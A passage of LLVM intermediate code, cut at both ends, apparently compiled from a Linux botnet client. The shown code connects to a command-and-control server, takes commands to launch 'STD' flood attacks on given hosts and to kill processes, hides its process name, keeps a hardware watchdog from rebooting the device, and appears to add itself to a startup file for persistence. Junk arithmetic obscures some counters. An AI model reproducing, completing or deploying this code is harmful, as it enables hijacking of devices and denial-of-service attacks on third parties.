  %624 = call i32 @strcmp(i8* %623, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.124, i32 0, i32 0)) #10
  %625 = icmp ne i32 %624, 0
  br i1 %625, label %674, label %626

; <label>:626:                                    ; preds = %620
  %627 = load i32, i32* %3, align 4
  %628 = icmp slt i32 %627, 4
  br i1 %628, label %641, label %629

; <label>:629:                                    ; preds = %626
  %630 = load i8**, i8*** %4, align 8
  %631 = getelementptr inbounds i8*, i8** %630, i64 2
  %632 = load i8*, i8** %631, align 8
  %633 = call i32 @atoi(i8* %632) #10
  %634 = icmp slt i32 %633, 1
  br i1 %634, label %641, label %635

; <label>:635:                                    ; preds = %629
  %636 = load i8**, i8*** %4, align 8
  %637 = getelementptr inbounds i8*, i8** %636, i64 3
  %638 = load i8*, i8** %637, align 8
  %639 = call i32 @atoi(i8* %638) #10
  %640 = icmp slt i32 %639, 1
  br i1 %640, label %641, label %642

; <label>:641:                                    ; preds = %635, %629, %626
  br label %728

; <label>:642:                                    ; preds = %635
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 1
  %645 = load i8*, i8** %644, align 8
  store i8* %645, i8** %38, align 8
  %646 = load i8**, i8*** %4, align 8
  %647 = getelementptr inbounds i8*, i8** %646, i64 2
  %648 = load i8*, i8** %647, align 8
  %649 = call i32 @atoi(i8* %648) #10
  store i32 %649, i32* %39, align 4
  %650 = load i8**, i8*** %4, align 8
  %651 = getelementptr inbounds i8*, i8** %650, i64 3
  %652 = load i8*, i8** %651, align 8
  %653 = call i32 @atoi(i8* %652) #10
  store i32 %653, i32* %40, align 4
  %654 = load i8*, i8** %38, align 8
  %655 = call i8* @strstr(i8* %654, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #10
  %656 = icmp ne i8* %655, null
  br i1 %656, label %657, label %669

; <label>:657:                                    ; preds = %642
  %658 = load i8*, i8** %38, align 8
  %659 = call i8* @strtok(i8* %658, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %659, i8** %41, align 8
  br label %660

; <label>:660:                                    ; preds = %663, %657
  %661 = load i8*, i8** %41, align 8
  %662 = icmp ne i8* %661, null
  br i1 %662, label %663, label %668

; <label>:663:                                    ; preds = %660
  %664 = load i8*, i8** %41, align 8
  %665 = load i32, i32* %39, align 4
  %666 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %664, i32 %665, i32 %666)
  %667 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i32 0, i32 0)) #2
  store i8* %667, i8** %41, align 8
  br label %660

; <label>:668:                                    ; preds = %660
  br label %673

; <label>:669:                                    ; preds = %642
  %670 = load i8*, i8** %38, align 8
  %671 = load i32, i32* %39, align 4
  %672 = load i32, i32* %40, align 4
  call void @sendSTD(i8* %670, i32 %671, i32 %672)
  br label %673

; <label>:673:                                    ; preds = %669, %668
  br label %728

; <label>:674:                                    ; preds = %620
  %675 = load i8**, i8*** %4, align 8
  %676 = getelementptr inbounds i8*, i8** %675, i64 0
  %677 = load i8*, i8** %676, align 8
  %678 = call i32 @strcmp(i8* %677, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0)) #10
  %679 = icmp ne i32 %678, 0
  br i1 %679, label %728, label %680

; <label>:680:                                    ; preds = %674
  store i32 0, i32* %42, align 4
  store i64 0, i64* %43, align 8
  br label %681

; <label>:681:                                    ; preds = %710, %680
  %682 = load i64, i64* %43, align 8
  %683 = load i64, i64* @numpids, align 8
  %684 = icmp ult i64 %682, %683
  br i1 %684, label %685, label %717

; <label>:685:                                    ; preds = %681
  %686 = load i32*, i32** @pids, align 8
  %687 = load i64, i64* %43, align 8
  %688 = getelementptr inbounds i32, i32* %686, i64 %687
  %689 = load i32, i32* %688, align 4
  %690 = icmp ne i32 %689, 0
  br i1 %690, label %691, label %709

; <label>:691:                                    ; preds = %685
  %692 = load i32*, i32** @pids, align 8
  %693 = load i64, i64* %43, align 8
  %694 = getelementptr inbounds i32, i32* %692, i64 %693
  %695 = load i32, i32* %694, align 4
  %696 = call i32 @getpid() #2
  %697 = icmp ne i32 %695, %696
  br i1 %697, label %698, label %709

; <label>:698:                                    ; preds = %691
  %699 = load i32*, i32** @pids, align 8
  %700 = load i64, i64* %43, align 8
  %701 = getelementptr inbounds i32, i32* %699, i64 %700
  %702 = load i32, i32* %701, align 4
  %703 = call i32 @kill(i32 %702, i32 9) #2
  %704 = load i32, i32* %42, align 4
  %705 = add i32 %704, -673122864
  %706 = add i32 %705, 1
  %707 = sub i32 %706, -673122864
  %708 = add nsw i32 %704, 1
  store i32 %707, i32* %42, align 4
  br label %709

; <label>:709:                                    ; preds = %698, %691, %685
  br label %710

; <label>:710:                                    ; preds = %709
  %711 = load i64, i64* %43, align 8
  %712 = sub i64 0, %711
  %713 = sub i64 0, 1
  %714 = add i64 %712, %713
  %715 = sub i64 0, %714
  %716 = add i64 %711, 1
  store i64 %715, i64* %43, align 8
  br label %681

; <label>:717:                                    ; preds = %681
  %718 = load i32, i32* %42, align 4
  %719 = icmp sgt i32 %718, 0
  br i1 %719, label %720, label %724

; <label>:720:                                    ; preds = %717
  %721 = load i32, i32* @mainCommSock, align 4
  %722 = load i32, i32* %42, align 4
  %723 = call i32 (i32, i8*, ...) @sockprintf(i32 %721, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i32 %722)
  br label %727

; <label>:724:                                    ; preds = %717
  %725 = load i32, i32* @mainCommSock, align 4
  %726 = call i32 (i32, i8*, ...) @sockprintf(i32 %725, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0))
  br label %727

; <label>:727:                                    ; preds = %724, %720
  br label %728

; <label>:728:                                    ; preds = %727, %674, %673, %641, %619, %614, %577, %555, %523, %501, %426, %374, %286, %225, %220, %183, %161, %156, %121, %95, %88, %49
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

declare i32 @killer_kill(...) #3

declare i32 @killer_init(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %3, i8 0, i64 4096, i32 16, i1 false)
  %4 = load i32, i32* @mainCommSock, align 4
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %0
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = call i32 @close(i32 %7)
  store i32 0, i32* @mainCommSock, align 4
  br label %9

; <label>:9:                                      ; preds = %6, %0
  %10 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %11 = load i8*, i8** @cncip, align 8
  %12 = call i8* @strcpy(i8* %10, i8* %11) #2
  %13 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %13, i32* @mainCommSock, align 4
  %14 = load i32, i32* @mainCommSock, align 4
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %16 = load i32, i32* @cncport, align 4
  %17 = call i32 @connectTimeout(i32 %14, i8* %15, i32 %16, i32 30)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %20, label %19

; <label>:19:                                     ; preds = %9
  store i32 1, i32* %1, align 4
  br label %21

; <label>:20:                                     ; preds = %9
  store i32 0, i32* %1, align 4
  br label %21

; <label>:21:                                     ; preds = %20, %19
  %22 = load i32, i32* %1, align 4
  ret i32 %22
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %104

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %104

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %104

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.129, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.130, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %101

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %100

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 %95, -504822631
  %97 = add i32 %96, 1
  %98 = add i32 %97, -504822631
  %99 = add nsw i32 %95, 1
  store i32 %98, i32* %10, align 4
  br label %79

; <label>:100:                                    ; preds = %79
  br label %101

; <label>:101:                                    ; preds = %100, %65
  %102 = load i32, i32* %2, align 4
  %103 = call i32 @close(i32 %102)
  br label %104

; <label>:104:                                    ; preds = %101, %36, %29, %15
  %105 = load i32, i32* %1, align 4
  ret i32 %105
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [256 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca [256 x i8], align 16
  %15 = alloca [1024 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct._IO_FILE*, align 8
  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.91, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, -1
  %50 = and i32 919804304, %49
  %51 = xor i32 919804304, -1
  %52 = and i32 %47, %51
  %53 = xor i32 %48, -1
  %54 = and i32 %53, 919804304
  %55 = and i32 %48, %51
  %56 = or i32 %50, %52
  %57 = or i32 %54, %55
  %58 = xor i32 %56, %57
  %59 = xor i32 %47, %48
  call void @srand(i32 %58) #2
  %60 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %61 = call i32 @getpid() #2
  %62 = xor i32 %60, -1
  %63 = and i32 -1406497161, %62
  %64 = xor i32 -1406497161, -1
  %65 = and i32 %60, %64
  %66 = xor i32 %61, -1
  %67 = and i32 %66, -1406497161
  %68 = and i32 %61, %64
  %69 = or i32 %63, %65
  %70 = or i32 %67, %68
  %71 = xor i32 %69, %70
  %72 = xor i32 %60, %61
  call void @init_rand(i32 %71)
  store i32 0, i32* %7, align 4
  %73 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.131, i32 0, i32 0))
  %74 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.132, i32 0, i32 0))
  store i32 0, i32* %8, align 4
  %75 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.133, i32 0, i32 0), i32 2)
  store i32 %75, i32* %8, align 4
  %76 = icmp ne i32 %75, -1
  br i1 %76, label %80, label %77

; <label>:77:                                     ; preds = %2
  %78 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i32 0, i32 0), i32 2)
  store i32 %78, i32* %8, align 4
  %79 = icmp ne i32 %78, -1
  br i1 %79, label %80, label %91

; <label>:80:                                     ; preds = %77, %2
  store i32 1, i32* %9, align 4
  %81 = load i32, i32* %8, align 4
  %82 = call i32 (i32, i64, ...) @ioctl(i32 %81, i64 2147768068, i32* %9) #2
  %83 = call i32 @fork() #2
  store i32 %83, i32* %10, align 4
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

; <label>:85:                                     ; preds = %80
  br label %86

; <label>:86:                                     ; preds = %86, %85
  %87 = load i32, i32* %8, align 4
  %88 = call i32 (i32, i64, ...) @ioctl(i32 %87, i64 2147768069, i32 0) #2
  %89 = call i32 @sleep(i32 10)
  br label %86

; <label>:90:                                     ; preds = %80
  br label %91

; <label>:91:                                     ; preds = %90, %77
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.135, i32 0, i32 0), i8** %12, align 8
  %92 = load i8*, i8** %12, align 8
  %93 = call %struct._IO_FILE* @fopen(i8* %92, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %93, %struct._IO_FILE** %13, align 8
  %94 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %95 = icmp eq %struct._IO_FILE* %94, null
  br i1 %95, label %96, label %99

; <label>:96:                                     ; preds = %91
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.137, i32 0, i32 0), i8** %12, align 8
  %97 = load i8*, i8** %12, align 8
  %98 = call %struct._IO_FILE* @fopen(i8* %97, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store %struct._IO_FILE* %98, %struct._IO_FILE** %13, align 8
  br label %99

; <label>:99:                                     ; preds = %96, %91
  %100 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %101 = icmp ne %struct._IO_FILE* %100, null
  br i1 %101, label %102, label %195

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 0
  %105 = load i8*, i8** %104, align 8
  %106 = call i64 @strlen(i8* %105) #10
  %107 = trunc i64 %106 to i32
  store i32 %107, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %108 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %109 = call i8* @getcwd(i8* %108, i64 256) #2
  %110 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %111 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #10
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %191

; <label>:113:                                    ; preds = %102
  br label %114

; <label>:114:                                    ; preds = %124, %113
  %115 = load i8**, i8*** %5, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 0
  %117 = load i8*, i8** %116, align 8
  %118 = load i32, i32* %16, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8, i8* %117, i64 %119
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = icmp ne i32 %122, 47
  br i1 %123, label %124, label %130

; <label>:124:                                    ; preds = %114
  %125 = load i32, i32* %16, align 4
  %126 = sub i32 %125, 1058483921
  %127 = add i32 %126, -1
  %128 = add i32 %127, 1058483921
  %129 = add nsw i32 %125, -1
  store i32 %128, i32* %16, align 4
  br label %114

; <label>:130:                                    ; preds = %114
  %131 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %132 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 0
  %135 = load i8*, i8** %134, align 8
  %136 = load i32, i32* %16, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = call i32 (i8*, i8*, ...) @sprintf(i8* %131, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.138, i32 0, i32 0), i8* %132, i8* %138) #2
  br label %140

; <label>:140:                                    ; preds = %169, %130
  %141 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %142 = call i32 @feof(%struct._IO_FILE* %141) #2
  %143 = icmp ne i32 %142, 0
  %144 = xor i1 %143, true
  %145 = and i1 true, %144
  %146 = xor i1 true, true
  %147 = and i1 %143, %146
  %148 = xor i1 true, true
  %149 = and i1 %148, true
  %150 = and i1 true, %146
  %151 = or i1 %145, %147
  %152 = or i1 %149, %150
  %153 = xor i1 %151, %152
  %154 = xor i1 %143, true
  br i1 %153, label %155, label %170

; <label>:155:                                    ; preds = %140
  %156 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %157 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %158 = call i8* @fgets(i8* %156, i32 1024, %struct._IO_FILE* %157)
  %159 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %160 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %161 = call i32 @strcasecmp(i8* %159, i8* %160) #10
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %169, label %163

; <label>:163:                                    ; preds = %155
  %164 = load i32, i32* %17, align 4
  %165 = add i32 %164, 1822594501
  %166 = add i32 %165, 1
  %167 = sub i32 %166, 1822594501
  %168 = add nsw i32 %164, 1
  store i32 %167, i32* %17, align 4
  br label %169

; <label>:169:                                    ; preds = %163, %155
  br label %140

; <label>:170:                                    ; preds = %140
  %171 = load i32, i32* %17, align 4
  %172 = icmp eq i32 %171, 0
  br i1 %172, label %173, label %187

; <label>:173:                                    ; preds = %170
  %174 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %175 = call i32 @fclose(%struct._IO_FILE* %174)
  %176 = load i8*, i8** %12, align 8
  %177 = call %struct._IO_FILE* @fopen(i8* %176, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.139, i32 0, i32 0))
  store %struct._IO_FILE* %177, %struct._IO_FILE** %18, align 8
  %178 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %179 = icmp ne %struct._IO_FILE* %178, null
  br i1 %179, label %180, label %186

; <label>:180:                                    ; preds = %173
  %181 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %182 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %183 = call i32 @fputs(i8* %181, %struct._IO_FILE* %182)
  %184 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %185 = call i32 @fclose(%struct._IO_FILE* %184)
  br label %186

; <label>:186:                                    ; preds = %180, %173
  br label %190

; <label>:187:                                    ; preds = %170
  %188 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %189 = call i32 @fclose(%struct._IO_FILE* %188)
  br label %190

; <label>:190:                                    ; preds = %187, %186
  br label %194

; <label>:191:                                    ; preds = %102
  %192 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %193 = call i32 @fclose(%struct._IO_FILE* %192)
  br label %194

; <label>:194:                                    ; preds = %191, %190
  br label %195

; <label>:195:                                    ; preds = %194, %99
  %196 = call i32 @getOurIP()
  %197 = call i32 @fork() #2
  %198 = icmp sgt i32 %197, 0
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %195
  ret i32 0

; <label>:200:                                    ; preds = %195
  %201 = call i32 @setsid() #2
  store i32 %201, i32* @pgid, align 4
  %202 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i32 0, i32 0)) #2
  %203 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %204

; <label>:204:                                    ; preds = %538, %207, %200
  %205 = call i32 @initConnection()
  %206 = icmp ne i32 %205, 0
  br i1 %206, label %207, label %209

; <label>:207:                                    ; preds = %204
  %208 = call i32 @sleep(i32 5)
  br label %204

; <label>:209:                                    ; preds = %204
  %210 = load i32, i32* @mainCommSock, align 4
  %211 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %212 = call i8* @inet_ntoa(i32 %211) #2
  %213 = call i32 (i32, i8*, ...) @sockprintf(i32 %210, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.140, i32 0, i32 0), i8* %212, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0))
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  br label %214

; <label>:214:                                    ; preds = %537, %444, %359, %327, %209
  %215 = load i32, i32* @mainCommSock, align 4
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %217 = call i32 @recvLine(i32 %215, i8* %216, i32 4096)
  store i32 %217, i32* %20, align 4
  %218 = icmp ne i32 %217, -1
  br i1 %218, label %219, label %538

; <label>:219:                                    ; preds = %214
  store i32 0, i32* %21, align 4
  br label %220

; <label>:220:                                    ; preds = %313, %219
  %221 = load i32, i32* %21, align 4
  %222 = sext i32 %221 to i64
  %223 = load i64, i64* @numpids, align 8
  %224 = icmp ult i64 %222, %223
  br i1 %224, label %225, label %318

; <label>:225:                                    ; preds = %220
  %226 = load i32*, i32** @pids, align 8
  %227 = load i32, i32* %21, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i32, i32* %226, i64 %228
  %230 = load i32, i32* %229, align 4
  %231 = call i32 @waitpid(i32 %230, i32* null, i32 1)
  %232 = icmp sgt i32 %231, 0
  br i1 %232, label %233, label %312

; <label>:233:                                    ; preds = %225
  %234 = load i32, i32* %21, align 4
  %235 = sub i32 0, %234
  %236 = sub i32 0, 1
  %237 = add i32 %235, %236
  %238 = sub i32 0, %237
  %239 = add nsw i32 %234, 1
  store i32 %238, i32* %23, align 4
  br label %240

; <label>:240:                                    ; preds = %259, %233
  %241 = load i32, i32* %23, align 4
  %242 = zext i32 %241 to i64
  %243 = load i64, i64* @numpids, align 8
  %244 = icmp ult i64 %242, %243
  br i1 %244, label %245, label %265

; <label>:245:                                    ; preds = %240
  %246 = load i32*, i32** @pids, align 8
  %247 = load i32, i32* %23, align 4
  %248 = zext i32 %247 to i64
  %249 = getelementptr inbounds i32, i32* %246, i64 %248
  %250 = load i32, i32* %249, align 4
  %251 = load i32*, i32** @pids, align 8
  %252 = load i32, i32* %23, align 4
  %253 = add i32 %252, 1815277067
